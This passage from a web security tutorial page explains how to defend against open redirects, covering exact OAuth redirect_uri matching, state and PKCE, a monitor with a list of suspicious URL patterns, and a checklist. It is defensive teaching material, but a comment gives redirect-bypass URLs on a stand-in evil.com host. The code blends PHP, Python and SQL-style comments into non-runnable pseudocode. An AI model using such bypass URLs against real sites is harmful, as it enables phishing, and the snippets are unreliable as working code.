          <pre><code><span class="code-comment">-- 1. Exact match validation (not partial!)</span>
<span class="code-comment">-- Registered: https://app.example.com/oauth/callback</span>
<span class="code-comment">-- Accept ONLY exact match, not:</span>
<span class="code-comment">--   https://app.example.com/oauth/callback/extra</span>
<span class="code-comment">--   https://app.example.com/oauth/callback?param=1</span>
<span class="code-comment">--   https://evil.com?x=https://app.example.com/oauth/callback</span>

<span class="code-comment">-- 2. State parameter validation</span>
<span class="code-keyword">$state</span> = <span class="code-function">bin2hex</span>(<span class="code-function">random_bytes</span>(<span class="code-number">32</span>));  <span class="code-comment">-- Cryptographically random</span>
<span class="code-keyword">$_SESSION</span>[<span class="code-string">'oauth_state'</span>] = <span class="code-keyword">$state</span>;

<span class="code-comment">-- Authorization request:</span>
<span class="code-string">https://provider.com/oauth/authorize?client_id=123&redirect_uri=EXACT_URI&state=SESSION_STATE</span>

<span class="code-comment">-- Callback validation:</span>
<span class="code-keyword">if</span> (!<span class="code-function">hash_equals</span>(<span class="code-keyword">$_SESSION</span>[<span class="code-string">'oauth_state'</span>], <span class="code-keyword">$_GET</span>[<span class="code-string">'state'</span>])) {
    <span class="code-keyword">throw</span> <span class="code-keyword">new</span> \SecurityException(<span class="code-string">"Invalid state parameter"</span>);
}

<span class="code-comment">-- 3. PKCE (Proof Key for Code Exchange) - prevents code interception</span>
<span class="code-keyword">$code_verifier</span> = <span class="code-function">base64url_encode</span>(<span class="code-function">random_bytes</span>(<span class="code-number">32</span>));
<span class="code-keyword">$code_challenge</span> = <span class="code-function">base64url_encode</span>(<span class="code-function">hash</span>(<span class="code-string">'sha256'</span>, <span class="code-keyword">$code_verifier</span>, <span class="code-keyword">true</span>));

<span class="code-comment">-- Send code_challenge with authorization request</span>
<span class="code-comment">-- Exchange code_verifier for token (prevents stolen code usage)</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Monitoring and Alerting</h3>
        <p class="text-content">
          Detect and respond to redirect exploitation attempts in real-time.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Redirect Monitoring</span></div>
          <pre><code><span class="code-keyword">class</span> <span class="code-function">RedirectMonitor</span> {
    <span class="code-function">SUSPICIOUS_PATTERNS</span> = [
        <span class="code-string">r'javascript:'</span>,
        <span class="code-string">r'data:'</span>,
        <span class="code-string">r'vbscript:'</span>,
        <span class="code-string">r'file:'</span>,
        <span class="code-string">r'//[^/]+'</span>,  <span class="code-comment">-- Protocol-relative</span>
        <span class="code-string">r'@'</span>,  <span class="code-comment">-- Userinfo</span>
    ];
    
    <span class="code-keyword">def</span> <span class="code-function">log_redirect_attempt</span>(self, requested_url, validated_url, user_ip, user_agent):
        <span class="code-keyword">if</span> requested_url != validated_url:
            <span class="code-comment"># Redirect was modified/sanitized</span>
            self.<span class="code-function">alert_security_team</span>({
                <span class="code-string">'type'</span>: <span class="code-string">'blocked_redirect'</span>,
                <span class="code-string">'requested'</span>: requested_url,
                <span class="code-string">'sanitized_to'</span>: validated_url,
                <span class="code-string">'ip'</span>: user_ip,
                <span class="code-string">'ua'</span>: user_agent,
                <span class="code-string">'timestamp'</span>: datetime.<span class="code-function">utcnow</span>().<span class="code-function">isoformat</span>()
            })
            
            <span class="code-comment"># Rate limiting: Block IP if too many suspicious redirects</span>
            self.<span class="code-function">check_rate_limit</span>(user_ip)
    
    <span class="code-keyword">def</span> <span class="code-function">check_rate_limit</span>(self, ip):
        <span class="code-keyword">key</span> = <span class="code-string">f"redirect_attempts:{ip}"</span>
        count = redis.<span class="code-function">incr</span>(key)
        redis.<span class="code-function">expire</span>(key, <span class="code-number">3600</span>)
        
        <span class="code-keyword">if</span> count > <span class="code-number">10</span>:
            <span class="code-keyword">self</span>.<span class="code-function">block_ip</span>(ip)
            <span class="code-keyword">self</span>.<span class="code-function">notify_soc</span>(<span class="code-string">f"IP {ip} blocked for redirect abuse"</span>)</code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Eliminate user-controlled redirects</strong><br>
            Use internal mapping tables or session-stored destinations instead of URL parameters
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Implement strict allowlists</strong><br>
            Validate complete URLs against exact allowlists, not partial string matches
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Use proper URL parsing libraries</strong><br>
            Never use string operations (strpos, regex) for URL validation; use parse_url, URL(), urllib
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Enforce HTTPS-only redirects</strong><br>
            Reject http:, javascript:, data:, and all non-HTTPS protocols
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Validate hostnames exactly</strong><br>
            Prevent subdomain takeover by validating exact host or explicit subdomain allowlists
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Implement OAuth PKCE and exact redirect_uri matching</strong><br>
            Use PKCE for all OAuth flows; match redirect_uri exactly, not partially
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Set CSP navigate-to and X-Frame-Options</strong><br>
            Limit where pages can navigate and prevent framing of redirect endpoints
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Monitor and alert on blocked redirects</strong><br>
            Log all sanitized redirects; rate-limit and block IPs with suspicious patterns
          </div>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for Open Redirects</div>
          <div class="diagram-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete open redirect protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>